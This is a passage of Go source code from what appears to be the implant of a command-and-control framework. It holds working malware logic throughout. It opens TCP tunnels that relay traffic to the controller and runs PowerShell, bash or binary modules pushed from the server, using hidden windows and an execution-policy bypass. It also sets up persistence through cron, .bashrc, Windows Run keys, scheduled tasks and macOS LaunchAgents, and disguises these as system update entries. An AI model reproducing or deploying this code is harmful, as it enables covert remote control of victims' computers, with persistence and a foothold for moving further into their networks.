	case <-time.After(timeout + 2*time.Second):
		mu.Lock()
		output = []byte("task killed: command timed out and could not be terminated")
		exitCode = 124
		errMsg = "command timed out"
		mu.Unlock()
	}

	return &proto.TaskResult{
		TaskId:       task.TaskId,
		Output:       string(output),
		ExitCode:     exitCode,
		Success:      exitCode == 0,
		ErrorMessage: errMsg,
	}
}

func (a *Agent) handleTunnelOpen(cmd string) *proto.TaskResult {
	// Format: tunnel_open:ID:target
	parts := strings.SplitN(cmd, ":", 3)
	if len(parts) < 3 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid tunnel_open format"}
	}
	id, target := parts[1], parts[2]

	log.Printf("[AGENT] Tunnel open: %s → %s", id, target)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return &proto.TaskResult{
			TaskId:  "tun-open-" + id,
			Output:  fmt.Sprintf("tunnel_err:%s:%v", id, err),
			Success: false, ErrorMessage: err.Error(),
		}
	}

	a.tunnelsMu.Lock()
	a.tunnels[id] = conn
	a.tunnelsMu.Unlock()

	// Start reading from the tunnel connection
	go func() {
		buf := make([]byte, 32768)
		for a.running {
			conn.SetReadDeadline(time.Now().Add(30 * time.Second))
			n, err := conn.Read(buf)
			if err != nil {
				log.Printf("[AGENT] Tunnel %s read closed: %v", id, err)
				break
			}
			if n > 0 {
				encoded := base64.StdEncoding.EncodeToString(buf[:n])
				log.Printf("[AGENT] Tunnel %s read %d bytes, pushing to results", id, n)
				a.results <- &proto.TaskResult{
					TaskId:  "tun-data-" + id,
					Output:  fmt.Sprintf("tunnel_data:%s:%s", id, encoded),
					Success: true,
				}
			}
		}
		a.tunnelsMu.Lock()
		delete(a.tunnels, id)
		a.tunnelsMu.Unlock()
	}()

	return &proto.TaskResult{
		TaskId:  "tun-open-" + id,
		Output:  fmt.Sprintf("tunnel_ok:%s", id),
		Success: true,
	}
}

func (a *Agent) handleTunnelData(cmd string) *proto.TaskResult {
	// Format: tunnel_data:ID:base64data
	parts := strings.SplitN(cmd, ":", 3)
	if len(parts) < 3 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid tunnel_data format"}
	}
	id, encoded := parts[1], parts[2]

	a.tunnelsMu.Lock()
	conn, ok := a.tunnels[id]
	a.tunnelsMu.Unlock()

	if !ok {
		return &proto.TaskResult{Success: false, ErrorMessage: "tunnel not found: " + id}
	}

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "base64 decode failed"}
	}

	if _, err := conn.Write(data); err != nil {
		a.handleTunnelClose("tunnel_close:" + id)
		return &proto.TaskResult{Success: false, ErrorMessage: "write failed: " + err.Error()}
	}

	return &proto.TaskResult{Success: true, Output: "ok"}
}

func (a *Agent) handleTunnelClose(cmd string) *proto.TaskResult {
	// Format: tunnel_close:ID
	parts := strings.SplitN(cmd, ":", 2)
	if len(parts) < 2 {
		return &proto.TaskResult{Success: false}
	}
	id := parts[1]

	a.tunnelsMu.Lock()
	conn, ok := a.tunnels[id]
	if ok {
		delete(a.tunnels, id)
	}
	a.tunnelsMu.Unlock()

	if ok {
		conn.Close()
		log.Printf("[AGENT] Tunnel closed: %s", id)
	}

	return &proto.TaskResult{Success: true, Output: "closed"}
}

// --- Network helpers ---

func (a *Agent) sendEncrypted(msgType proto.EnvelopeType, payload protobuf.Message) error {
	a.writeMu.Lock()
	defer a.writeMu.Unlock()
	inner := &proto.EnvelopeInner{
		Id:           a.nextTxSeq(),
		Type:         msgType,
		Timestamp:    uint64(time.Now().UnixNano()),
		SessionToken: a.sessionToken,
	}

	switch msgType {
	case proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT:
		inner.Payload = &proto.EnvelopeInner_TaskResult{TaskResult: payload.(*proto.TaskResult)}
	case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
		inner.Payload = &proto.EnvelopeInner_Heartbeat{Heartbeat: payload.(*proto.Heartbeat)}
	case proto.EnvelopeType_ENVELOPE_TYPE_RECONNECT:
		inner.Payload = &proto.EnvelopeInner_Heartbeat{Heartbeat: payload.(*proto.Heartbeat)}
	default:
		return fmt.Errorf("unsupported type: %v", msgType)
	}

	innerBytes, _ := protobuf.Marshal(inner)
	encrypted, err := crypto.Encrypt(a.encKey, innerBytes)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}

	envelope := &proto.Envelope{
		Id:           inner.Id,
		Type:         msgType,
		Timestamp:    inner.Timestamp,
		SessionToken: a.sessionToken,
		Nonce:        encrypted[:crypto.NonceSize],
		Ciphertext:   encrypted[crypto.NonceSize:],
	}

	envBytes, _ := protobuf.Marshal(envelope)
	return a.sendBytes(envBytes)
}

func (a *Agent) recvEnvelope() (*proto.EnvelopeInner, error) {
	envData, err := a.recvBytes()
	if err != nil {
		return nil, err
	}

	envelope := &proto.Envelope{}
	if err := protobuf.Unmarshal(envData, envelope); err != nil {
		return nil, fmt.Errorf("unmarshal: %w", err)
	}

	encrypted := make([]byte, len(envelope.Nonce)+len(envelope.Ciphertext))
	copy(encrypted[:crypto.NonceSize], envelope.Nonce)
	copy(encrypted[crypto.NonceSize:], envelope.Ciphertext)

	decrypted, err := crypto.Decrypt(a.encKey, encrypted)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	inner := &proto.EnvelopeInner{}
	if err := protobuf.Unmarshal(decrypted, inner); err != nil {
		return nil, fmt.Errorf("unmarshal inner: %w", err)
	}

	if !hmac.Equal(inner.SessionToken, a.sessionToken) {
		return nil, fmt.Errorf("invalid session token")
	}
	a.seqRx++

	return inner, nil
}

func (a *Agent) sendRaw(env *proto.Envelope) error {
	envBytes, _ := protobuf.Marshal(env)
	return a.sendBytes(envBytes)
}

func (a *Agent) sendBytes(data []byte) error {
	lengthBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBuf, uint32(len(data)))
	if _, err := a.conn.Write(lengthBuf); err != nil {
		return err
	}
	_, err := a.conn.Write(data)
	return err
}

func (a *Agent) recvBytes() ([]byte, error) {
	lengthBuf := make([]byte, 4)
	if _, err := readFull(a.conn, lengthBuf); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(lengthBuf)
	if length > 100*1024*1024 {
		return nil, fmt.Errorf("message too large: %d", length)
	}
	data := make([]byte, length)
	if _, err := readFull(a.conn, data); err != nil {
		return nil, err
	}
	return data, nil
}

func (a *Agent) nextTxSeq() uint32 {
	a.seqTx++
	return a.seqTx
}

// --- Helpers ---

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if err != nil {
			return total, err
		}
		if n == 0 {
			return total, fmt.Errorf("connection closed")
		}
		total += n
	}
	return total, nil
}

func generateAgentID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("agent-%x", b)
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

// contextWithTimeout provides a simple context-like timeout without importing context package
func contextWithTimeout(d time.Duration) (chan struct{}, func()) {
	ch := make(chan struct{})
	timer := time.AfterFunc(d, func() { close(ch) })
	return ch, func() { timer.Stop() }
}

// DynamicModule is a module pushed from the C2 at runtime.
type DynamicModule struct {
	Name        string
	Version     string
	Platform    string
	Description string
	Type        string // "ps1", "sh", "binary"
	Commands    []string
	Payload     []byte
}

func (a *Agent) handleModuleLoad(cmd string) *proto.TaskResult {
	// Format: module_load:<base64 json>
	parts := strings.SplitN(cmd, ":", 2)
	if len(parts) < 2 {
		return &proto.TaskResult{Success: false, ErrorMessage: "invalid module_load format"}
	}

	data, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "base64 decode failed: " + err.Error()}
	}

	var packed struct {
		Manifest struct {
			Name        string   `json:"name"`
			Version     string   `json:"version"`
			Platform    string   `json:"platform"`
			Description string   `json:"description"`
			Type        string   `json:"type"`
			Commands    []string `json:"commands"`
		} `json:"manifest"`
		Payload string `json:"payload"`
	}

	if err := json.Unmarshal(data, &packed); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "json parse failed: " + err.Error()}
	}

	payload, _ := base64.StdEncoding.DecodeString(packed.Payload)

	dm := &DynamicModule{
		Name:        packed.Manifest.Name,
		Version:     packed.Manifest.Version,
		Platform:    packed.Manifest.Platform,
		Description: packed.Manifest.Description,
		Type:        packed.Manifest.Type,
		Commands:    packed.Manifest.Commands,
		Payload:     payload,
	}

	a.dynModules[dm.Name] = dm

	log.Printf("[AGENT] Module loaded: %s v%s (%s, %d bytes)", dm.Name, dm.Version, dm.Type, len(payload))

	return &proto.TaskResult{
		Success: true,
		Output:  fmt.Sprintf("Module '%s' v%s loaded — commands: %v", dm.Name, dm.Version, dm.Commands),
	}
}

// findDynamicModuleCommand checks if a command matches a loaded dynamic module.
func (a *Agent) findDynamicModuleCommand(cmd string) func(string) *proto.TaskResult {
	cmdName := cmd
	if idx := strings.Index(cmd, " "); idx > 0 {
		cmdName = cmd[:idx]
	}
	for _, dm := range a.dynModules {
		for _, c := range dm.Commands {
			if c == cmdName {
				return func(s string) *proto.TaskResult {
					args := ""
					if idx := strings.Index(s, " "); idx > 0 {
						args = s[idx+1:]
					}
					return a.ExecDynamicModule(dm.Name, args)
				}
			}
		}
	}
	return nil
}

// ExecDynamicModule executes a dynamically loaded module command.
func (a *Agent) ExecDynamicModule(name, args string) *proto.TaskResult {
	dm, ok := a.dynModules[name]
	if !ok {
		return &proto.TaskResult{Success: false, ErrorMessage: "module not loaded: " + name}
	}

	switch dm.Type {
	case "ps1":
		return a.execPowerShellModule(dm.Payload, args)
	case "sh":
		return a.execBashModule(dm.Payload, args)
	case "binary":
		return a.execBinaryModule(dm.Payload, args)
	default:
		return &proto.TaskResult{Success: false, ErrorMessage: "unsupported module type: " + dm.Type}
	}
}

func (a *Agent) execPowerShellModule(payload []byte, args string) *proto.TaskResult {
	if runtime.GOOS != "windows" {
		return &proto.TaskResult{Success: false, ErrorMessage: "PowerShell modules require Windows"}
	}
	// Write payload to temp, execute with PowerShell
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x.ps1", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, payload, 0600); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", tmpFile, "-Args", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

func (a *Agent) execBashModule(payload []byte, args string) *proto.TaskResult {
	if runtime.GOOS == "windows" {
		return &proto.TaskResult{Success: false, ErrorMessage: "Bash modules require Linux/macOS"}
	}
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x.sh", time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, payload, 0700); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command("bash", tmpFile, args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

func (a *Agent) execBinaryModule(payload []byte, args string) *proto.TaskResult {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("bty_%x", time.Now().UnixNano()))
	if runtime.GOOS == "windows" {
		tmpFile += ".exe"
	}
	if err := os.WriteFile(tmpFile, payload, 0700); err != nil {
		return &proto.TaskResult{Success: false, ErrorMessage: "write temp: " + err.Error()}
	}
	defer os.Remove(tmpFile)

	cmd := exec.Command(tmpFile, args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
	}
	return &proto.TaskResult{Success: true, Output: string(out)}
}

// --- Auto-Persistence ---

// isPersisted checks if the agent has already established persistence.
func (a *Agent) isPersisted() bool {
	switch runtime.GOOS {
	case "windows":
		// Check if registry Run key exists
		psCmd := `Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue`
		cmd := exec.Command("powershell", "-c", psCmd)
		out, _ := cmd.CombinedOutput()
		return len(out) > 0
	case "linux":
		// Check if crontab entry exists
		cmd := exec.Command("crontab", "-l")
		out, _ := cmd.CombinedOutput()
		return containsStr(string(out), "worldc2-agent")
	case "darwin":
		// Check if LaunchAgent plist exists
		plistPath := os.ExpandEnv("$HOME/Library/LaunchAgents/com.apple.softwareupdate.plist")
		_, err := os.Stat(plistPath)
		return err == nil
	}
	return false
}

// autoPersist establishes persistence using the best method for the OS.
func (a *Agent) autoPersist() {
	exePath, _ := os.Executable()
	serverAddr := a.serverAddr

	switch runtime.GOOS {
	case "linux":
		a.persistLinuxCron(exePath, serverAddr)
		a.persistLinuxBashrc(exePath, serverAddr)
	case "windows":
		a.persistWindowsRegistry(exePath, serverAddr)
		a.persistWindowsScheduledTask(exePath, serverAddr)
	case "darwin":
		a.persistDarwinLaunchAgent(exePath, serverAddr)
	}
}

func (a *Agent) persistLinuxCron(exePath, serverAddr string) {
	cronLine := fmt.Sprintf("@reboot %s --server %s >/dev/null 2>&1 &", exePath, serverAddr)
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".bty_cron_%d", time.Now().Unix()))

	// Get existing crontab
	existing, _ := exec.Command("crontab", "-l").CombinedOutput()
	content := string(existing)

	// Add our line if not present
	if !containsStr(content, "worldc2-agent") {
		if content != "" && !strings.HasSuffix(strings.TrimSpace(content), "\n") {
			content += "\n"
		}
		content += cronLine + "\n"
	}

	os.WriteFile(tmpFile, []byte(content), 0600)
	exec.Command("crontab", tmpFile).Run()
	os.Remove(tmpFile)
	log.Printf("[PERSIST] Linux crontab persistence established")
}

func (a *Agent) persistLinuxBashrc(exePath, serverAddr string) {
	bashrc := os.ExpandEnv("$HOME/.bashrc")
	line := fmt.Sprintf("\n# system update check\nnohup %s --server %s >/dev/null 2>&1 &\n", exePath, serverAddr)

	data, err := os.ReadFile(bashrc)
	if err != nil {
		return
	}

	if !containsStr(string(data), "worldc2-agent") {
		f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			f.WriteString(line)
			f.Close()
			log.Printf("[PERSIST] Linux .bashrc persistence established")
		}
	}
}

func (a *Agent) persistWindowsRegistry(exePath, serverAddr string) {
	psCmd := fmt.Sprintf(
		`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value '"%s" --server %s' -PropertyType String -Force`,
		exePath, serverAddr,
	)
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-c", psCmd)
	cmd.Run()
	log.Printf("[PERSIST] Windows Registry persistence established")
}

func (a *Agent) persistWindowsScheduledTask(exePath, serverAddr string) {
	taskCmd := fmt.Sprintf(
		`schtasks /create /tn "WindowsUpdateTask" /tr '"%s" --server %s' /sc onlogon /f`,
		exePath, serverAddr,
	)
	cmd := exec.Command("cmd", "/c", taskCmd)
	cmd.Run()
	log.Printf("[PERSIST] Windows Scheduled Task persistence established")
}

func (a *Agent) persistDarwinLaunchAgent(exePath, serverAddr string) {
	launchDir := os.ExpandEnv("$HOME/Library/LaunchAgents")
	os.MkdirAll(launchDir, 0755)

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array><string>%s</string><string>--server</string><string>%s</string></array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key><integer>3600</integer>
</dict>
</plist>`, exePath, serverAddr)

	plistFile := filepath.Join(launchDir, "com.apple.softwareupdate.plist")
	os.WriteFile(plistFile, []byte(plistContent), 0644)
	exec.Command("launchctl", "load", plistFile).Run()
	log.Printf("[PERSIST] macOS LaunchAgent persistence established")
}

func containsStr(s, substr string) bool {
	return len(s) >= len(substr) && searchStr(s, substr)
}

func searchStr(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

var _ = fmt.Sprintf
